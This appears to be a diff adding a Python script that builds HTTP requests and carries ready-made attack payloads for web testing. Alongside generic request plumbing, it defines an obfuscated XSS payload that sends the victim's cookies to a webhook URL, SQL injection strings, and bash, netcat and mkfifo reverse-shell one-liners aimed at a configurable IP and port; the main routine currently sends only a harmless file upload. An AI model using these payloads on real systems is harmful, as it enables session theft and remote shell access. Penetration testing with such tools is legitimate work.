@@ -1,0 +1,168 @@
+import requests
+import urllib.parse
+import base64
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+
+REVERSE_SHELL_IP = "127.0.0.1"
+REVERSE_SHELL_PORT = 1337
+
+WEBHOOK_URL = "https://webhook.site/your-unique-id"
+XSS_PAYLOAD = """const a = async () => {
+    navigator.sendBeacon(\"{WEBHOOK_URL}\", document.cookie);
+};
+a();"""
+
+def construct_url(url_object):
+    parameters = url_object.get("parameters", {})
+    path = url_object.get("path", "/")
+    protocol = url_object.get("protocol", "https")
+    domain = url_object.get("domain", "")
+    port = url_object.get("port", 443)
+    
+    params_str = urllib.parse.urlencode(parameters)
+    if params_str:
+        return f"{protocol}://{domain}:{port}{path}?{params_str}"
+    else:
+        return f"{protocol}://{domain}:{port}{path}"
+
+def construct_cookies(cookie_object):
+    cookies_arr = []
+    for cookie_name, cookie_value in cookie_object.items():
+        cookies_arr.append(f"{cookie_name}={cookie_value}")
+    return "; ".join(cookies_arr)
+
+def construct_x_www_form_urlencoded(body_object):
+    return urllib.parse.urlencode(body_object)
+
+def execute_parallel_requests(request_func, payloads, max_workers=10):
+    results = []
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        future_to_payload = {executor.submit(request_func, payload): payload 
+                            for payload in payloads}
+        for future in as_completed(future_to_payload):
+            payload = future_to_payload[future]
+            try:
+                response = future.result()
+                results.append((payload, response))
+            except Exception as e:
+                results.append((payload, f"Error: {str(e)}"))
+    return results
+
+sqli_payloads = [
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' /*",
+    "admin' --",
+    "admin' #",
+    "' UNION SELECT NULL--",
+    "1' AND '1'='1",
+]
+
+xss_payloads = [
+    f"<script>eval(atob('{base64.b64encode(XSS_PAYLOAD.replace('{WEBHOOK_URL}', WEBHOOK_URL).encode()).decode()}'))</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+    "<iframe src=javascript:alert(1)>",
+]
+
+reverse_shell_payloads = [
+    f"bash -i >& /dev/tcp/{REVERSE_SHELL_IP}/{REVERSE_SHELL_PORT} 0>&1",
+    f"nc -e /bin/sh {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT}",
+    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT} >/tmp/f",
+]
+
+def request_1(
+    url_object,
+    method,
+    headers,
+    cookies,
+    authorization,
+    body,
+    files,
+    common_headers,
+    timeout=30,
+    verify_ssl=True,
+    proxies=None,
+):
+    url = construct_url(url_object)
+    stringified_cookies = construct_cookies(cookies) if cookies else ""
+    files_data = []
+    if files:
+        for file in files:
+            content = base64.b64decode(file["data"])
+            content_type = file["contentType"]
+            file_name = file["filename"]
+            name = file["for"]
+            files_data.append((name, (file_name, content, content_type)))
+    form_data = body
+    h = {**common_headers, **headers}
+    if cookies:
+        h["Cookie"] = stringified_cookies
+    
+    if "Content-Type" in h:
+        del h["Content-Type"]
+    response = requests.request(
+        url=url,
+        method=method,
+        headers=h,
+        files=files_data if files else None,
+        data=form_data,
+        allow_redirects=False,
+        timeout=timeout,
+        verify=verify_ssl,
+        proxies=proxies,
+    )
+    return response
+
+def main():
+    common_headers = {
+        "Cookie": "c=123",
+        "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"",
+        "Sec-Ch-Ua-Platform": "\"macOS\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Content-Type": "multipart/form-data"
+    }
+    
+    # payloads = sqli_payloads
+    # payloads = xss_payloads
+    # payloads = reverse_shell_payloads
+    
+    method_1 = "POST"
+    headers_1 = {}
+    body_1 = {
+        "title": "my upload"
+    }
+    url_1 = {
+        "domain": "jsonplaceholder.typicode.com",
+        "protocol": "https",
+        "port": 443,
+        "path": "/upload",
+        "parameters": {},
+    }
+    cookies_1 = {
+        "c": "123"
+    }
+    # data_1 = base64.b64encode(open("notes.txt", "rb").read()).decode()
+    file_1 = {
+        "for": "file",
+        "filename": "notes.txt",
+        "contentType": "text/plain",
+        "data": "aGVsbG8gd29ybGQK"
+    }
+    files_1 = [file_1]
+    res_1 = request_1(
+        url_1,
+        method_1,
+        headers_1,
+        cookies_1,
+        None,
+        body_1,
+        files_1,
+        common_headers,
+    )
+    # print(res_1)
+
+if __name__ == "__main__":
+    main()
